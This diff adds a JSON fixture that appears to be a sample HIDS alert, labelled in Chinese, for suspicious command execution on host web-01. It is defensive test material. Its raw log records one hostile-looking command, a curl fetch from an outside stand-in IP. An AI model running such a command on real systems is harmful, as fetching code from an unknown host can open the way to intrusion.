@@ -1,0 +1,50 @@
+{
+  "alert": {
+    "alertId": "HIDS-2026-0001",
+    "alertCode": "PIE-2026-HIDS-0001",
+    "alertName": "web-01-可疑主机命令执行",
+    "riskLevel": "中危",
+    "status": "待审阅",
+    "primaryType": "入侵预警",
+    "secondaryType": "主机安全",
+    "tertiaryType": "可疑命令执行",
+    "profileCode": "PPAADM_HIDS_SAMPLE",
+    "profileName": "HIDS主机事件",
+    "createAt": "2026-06-18 09:15:00",
+    "hitLog": [
+      {
+        "topic": "sec_guard_hids",
+        "topicName": "HIDS主机事件",
+        "ruleCode": "RPAADM_HIDS_0001",
+        "ruleName": "【HIDS】可疑主机命令执行",
+        "zeusRawLogs": [
+          {
+            "message": "host=web-01 src=10.20.0.15 dst=10.10.2.15 user=enterprise-user-1 command='curl http://198.51.100.10/a' event_type=process_execution",
+            "sip": "10.20.0.15",
+            "dip": "10.10.2.15",
+            "device__hostname": "web-01",
+            "device__ip": "10.10.2.15",
+            "str_source_host": "web-01",
+            "str_source_ip": "10.10.2.15",
+            "str_user_process": "enterprise-user-1",
+            "str_process_short": "bash",
+            "str_cmd": "curl http://198.51.100.10/a",
+            "event_type": "process_execution",
+            "finding__title": "可疑主机命令执行",
+            "finding__desc": "主机web-01在告警窗口内执行了外联命令，需要结合维护窗口和登录上下文确认。",
+            "severity": "Medium",
+            "risk_level": "High",
+            "t_detect_time": "2026-06-18 09:12:30",
+            "finding__uid": "hids-sample-0001",
+            "appname": "hids",
+            "metadata__product__name": "hids"
+          }
+        ]
+      }
+    ],
+    "soar": [],
+    "asset": [],
+    "content": []
+  },
+  "relatedAlertList": []
+}
